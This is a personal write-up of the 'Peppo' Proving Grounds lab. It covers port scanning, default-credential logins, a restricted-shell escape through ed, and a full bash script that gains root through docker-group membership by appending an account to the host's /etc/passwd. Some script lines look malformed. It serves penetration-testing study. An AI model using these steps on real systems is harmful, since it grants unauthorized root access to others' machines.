---
layout: writeup
title: Peppo - Proving Grounds
date: 2024-07-21 13:32:20 +0300
description: A Writeup of the Peppo Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, LainKusunagi]
---

Here's a writeup for Marketing, an Intermediate Proving Grounds box I saw on the LainKusunagi OSCP Prep List. I take note that the community has rated this Hard. Let's kick things off with a port scan using nmap: `sudo nmap -p- -T4 -v 192.168.242.60`.

```
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
113/tcp   open   ident
5432/tcp  open   postgresql
8080/tcp  open   http-proxy
10000/tcp open   snet-sensor-mgmt
```

Pretty quickly we see there is a port open on 8080, so I go to the browser to check it and begin a gobuster scan to check for any particularly interesting directories. 

![Peppo1.png](/assets/images/Peppo/Peppo1.png){: .responsive-image}
The directory scan shows a page called `/users` which prompts us to login. I try `admin:admin` which works, but we get prompted for a new password (`party321`). I click around a while in the application and check for exploits online. While I'm enumerating the site, I create a test project to see what that does. I can't exactly tell, but once I'm in the project, I see a field for files, and that reminds me of a settings page with allowed extensions. 

![Peppo2.png](/assets/images/Peppo/Peppo2.png){: .responsive-image}

I add a few, including Ruby due to Wappalyzer. I create a ruby shell and upload it, but it seems to only show the text when clicking the file after.

![Peppo3.png](/assets/images/Peppo/Peppo3.png){: .responsive-image}
Maybe there's another way to execute or access, but I don't immediately see one in browser or in my still-running gobuster scan. 

I try an [exploit](https://github.com/slowmistio/Redmine-CVE-2019-18890) I saw earlier on, but I can't seem to get it working. It is a SQL injection with a sample `SLEEP(5)` injection, and the output says it was successful, but it doesn't take 5 sections, and it says it's successful even when I use a URL with a sub-directory that doesn't exist. Checking the Information panel in the admin console shows us that we are working with `Redmine version 4.1.1.stable`, so that's probably a dead end. It may be time to explore ports 113, 5432, and 10000. 

I check out port 113 which is running ident. I don't know much about it, but apparently it associates TCP connections with a specific user, and we can install `ident-user-enum` with apt. So I run it on the open ports, and get `ident-user-enum 192.168.242.60 10000` to return `eleanor`. Maybe that's useful. 

I try to use that with `psql` to connect to the PostgreSQL service, but I can't get that working. Port 10000 returns 'Hello World' in browser, but Wappalyzer suggests this is ultimately coming from Redmine, and is not a webserver for which we can scan the directory. 

After a few hours I give up and look for a hint. It turns out we can log in through SSH using `eleanor:eleanor`. I have rarely if ever seen that in a lab like this. SSH usually seems to be for administration for the lab, not the first foothold. So that's lesson learned 1 - remember to try that. Dumb. But I SSH in and find the shell is restricted. 

![Peppo4.png](/assets/images/Peppo/Peppo4.png){: .responsive-image}

I can't `cd`, `cat`, or redirect output (`>` or `>>`), and a number of basic commands are not found. I try to use `scp` to copy files into eleanor's home directory, but I get a connection closed. We can however `echo $PATH` which returns `/home/eleanor/bin`, and then we can `ls /home/eleanor/bin` to find which commands we can run. 
![Peppo5.png](/assets/images/Peppo/Peppo5.png){: .responsive-image}

Maybe we can use one of those. Gtfobins says we can use `ed` to break out of a restricted environment so I run `ed` and `!/bin/sh`. This kind of works, but tit turns out we need the full path to run some commands like `cat`. 

![Peppo6.png](/assets/images/Peppo/Peppo6.png){: .responsive-image}

Not that big of a deal. I can also cd into helloworld and find `index.js` which shows: 

```
const http = require('http');
const hostname = '0.0.0.0';
const port = 10000;
http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Hello World\n');
}).listen(port, hostname, () => {
  console.log('Server running...');
});

```

That looks like what we see in port 10000. I try echoing a .js shell in the same directory, but the permission is denied. The `find` command is not on the machine either to help find SUID binaries. `Sudo` isn't either. I upload lse, les, and linpeas to try those out using the full path of `/usr/bin/wget` (or simply using a penelope shell and using native commands to upload it).

Linpeas really wants us to notice the docker group we are a part of. 

![Peppo7.png](/assets/images/Peppo/Peppo7.png){: .responsive-image}

I check for docker commands on gtfobins, and most of them seem to need some kind of downloaded image. For example when I run `CONTAINER_ID="$(docker run -d alpine)"`, I get the response, `Unable to find image 'alpine:latest' locally` - same with debian which we are actually on according to `/bin/uname -a`. Apparently docker images are usually stored in `/var/lib/docker`, but we don't have access. I can however run `/usr/bin/docker ps -a` to get a list of all images and see that redmine and postgres are available. Unfortunately even substituting these images does not seem to allow us to overwrite `/etc/sudoers` (like in [Nukem](remember to link)) or `/etc/passwd` as in others. It also won't allow me to read protected files so I'm not exactly sure why linpeas flagged it.

After a few more hours I give up and check a writeup. Turns out I did need docker, and I was just looking at the wrong code on gtfobins. I can't use it to do privileged read or writes, but just using it to get a shell automatically gives you a root shell. 

![Peppo8.png](/assets/images/Peppo/Peppo8.png){: .responsive-image}

My experience to this point is that this section of gtfobins just gets you a shell. This is what we did with `ed` actually, but it didn't give you a root shell. Now I know I guess. 

![Peppo9.png](/assets/images/Peppo/Peppo9.png){: .responsive-image}

Lessons learned: Try to log into ssh even though it's a Proving Grounds lab, and make sure to do a little more reading on the topic. After I "completed" the lab, I went back and read a little bit more to try to solidify my understanding. [This](https://flast101.github.io/docker-privesc/)post helped. It also pointed out that I was only still in the container, but I was able to read the proof flag. So I did go ahead and edit /`/etc/passwd` and create a new user with a password generated from openssl. I was able to ssh using that user getting full root access over the machine. 

That same post also had a script PoC. The version posted did not work because we had to change a lot of different commands to their full paths, so it took a bit of trial and error. The final script looks like this: 

```
#!/bin/bash

docker_test=$( /usr/bin/docker ps | /bin/grep "CONTAINER ID" | /usr/bin/cut -d " " -f 1-2 ) 

if [ $(/usr/bin/id -u) -eq 0 ]; then
    echo "The user islready root. Have fun ;-)"
    exit
    
elif [ "$docker_test" == "CONTAINER ID" ]; then
    echo 'Please write down your new root credentials.'
    read -p 'Choose a root user name: ' rootname
    read -s -p 'Choose a root password: ' passw
    hpass=$(/usr/bin/openssl passwd -1 -salt mysalt $passw)

    echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
    mv new_account /tmp/new_account
    /usr/bin/docker run -tid -v /:/mnt/ --name flast101.github.io redmine # CHANGE THIS IF NEEDED
    /usr/bin/docker exec -ti flast101.github.io sh -c "/bin/cat /mnt/tmp/new_account >> /mnt/etc/passwd"
    sleep 1; echo '...'
    
    echo 'Success! Root user ready. Enter your password to login as root:'
    /usr/bin/docker /bin/rm -f flast101.github.io
    /usr/bin/docker image /bin/rm redmine
    /bin/rm /tmp/new_account
    /bin/su $rootname

else echo "Your account does not have permission to execute docker or docker is not running, aborting..."
    exit

fi

```

Note that some of the commands require `/usr/bin/$command` and some just `/bin/$command`. Eventually I did get it working though, so that was always an option. I found this blog earlier in my research but failed to properly read through it, so again this is another box that I shouldn't have needed a writeup for. I got up with the intention of reading it when I sat back down and failed to do so. Not great, but now I know, and at least I punished myself with a few hours of looking aimlessly around the box. 

** Bonus: This escalation path is featured in the last video of [TCM's Linux Privilege Escalation Course](https://academy.tcm-sec.com/courses/) which I happened to view the very next day. 

